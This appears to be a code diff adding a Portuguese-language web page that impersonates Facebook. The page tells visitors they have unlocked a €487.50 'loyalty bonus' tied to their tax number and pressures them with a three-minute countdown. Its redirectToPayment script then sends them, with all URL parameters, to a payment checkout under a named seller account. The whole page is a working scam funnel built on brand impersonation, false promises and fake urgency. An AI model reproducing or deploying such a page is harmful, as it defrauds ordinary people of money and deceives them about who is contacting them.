@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+
+<head>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "wnj6nzjur9");
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bónus Exclusivo Facebook Pro</title>
+    <link rel="stylesheet" href="/css/upsell-premium.css">
+</head>
+
+<body>
+    <div class="premium-container">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="Facebook" class="logo" style="height: 30px;">
+        </div>
+
+        <div class="badge">Nível Ouro Alcançado</div>
+
+        <h1 class="title">Parabéns! Desbloqueou o <span class="highlight-cyan">Bónus de Fidelidade Pro</span></h1>
+
+        <div class="description">
+            O nosso sistema detetou que a sua conta atingiu o status <strong>Elite</strong>. Um saldo adicional acumulado foi libertado para o seu NIF.
+        </div>
+
+        <div class="amount-box">
+            <div class="amount-label">VALOR EXTRA DISPONÍVEL</div>
+            <div class="amount-value">€487,50</div>
+        </div>
+
+        <div class="description">
+            Este valor será somado ao seu levantamento principal e enviado <span class="highlight-cyan">IMEDIATAMENTE</span> via MB Way ou IBAN após a ativação.
+        </div>
+
+        <button onclick="redirectToPayment()" class="cta-button pulse">
+            <span>RESGATAR BÓNUS AGORA</span>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+        </button>
+
+        <p class="footer-text">
+            © 2026 Facebook Portugal. Oferta expira em 3:00 minutos.
+        </p>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            let paramsObject = {};
+            params.forEach((value, key) => {
+                paramsObject[key] = value;
+            });
+            return paramsObject;
+        }
+
+        function redirectToPayment() {
+            const params = new URLSearchParams(window.location.search);
+            const checkoutUrl = new URL('https://waymb.com/c?username=eduardotreonix&product=6');
+
+            params.forEach((value, key) => {
+                checkoutUrl.searchParams.set(key, value);
+            });
+
+            window.location.href = checkoutUrl.toString();
+        }
+    </script>
+</body>
+
+</html>
